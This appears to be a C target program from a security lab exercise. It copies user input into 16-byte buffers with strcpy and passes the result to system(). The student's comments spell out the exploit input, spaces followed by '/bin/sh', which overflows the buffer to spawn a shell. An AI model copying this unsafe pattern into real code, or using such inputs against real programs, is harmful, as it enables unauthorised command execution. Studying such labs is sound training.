#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo(char * arg)
{
	char cmd[16];
	char par[16];
	char * p;

	strcpy(cmd, "ls --color -l ");
	strcpy(par, arg);

	printf("You can use \"%s %s\" to list the files in dir \"%s\"!\n",
														cmd, par, par);

	p = (char*)malloc(strlen(cmd) + strlen(par) + 2);  // strlen  excluding the terminating null byte ('\0').
	strcpy(p, cmd); // strcpy copies the string pointed to by src,including the terminating null byte ('\0'), to the buffer pointed to by dest
	strcat(p, " "); // strcat overwriting the terminating null byte ('\0') at the end of dest, and then adds a terminating null byte.
	strcat(p, par);
		// soluion in exploit1.sh, I wrote this 
		// ../targets/target1 "        "/bin/sh";"
		// rembeber to put ; inside "" otherwise bash will not treat it as an input but the end of the input.
		// U dont have to use ";", you can put one more space in "        ", 9 spaces in other words.
		// ../targets/target1 "         "/bin/sh
	    printf("p is: %s\n",p);  // add by me
	system(p);     //p is:          /bin/sh;  //9 spaces before /bin/sh
}	

int main(int argc, char ** argv)
{
	if (argc > 1)
		foo(argv[1]);
	else
		printf("usage: %s dir\n", argv[0]);
	return 0;
}

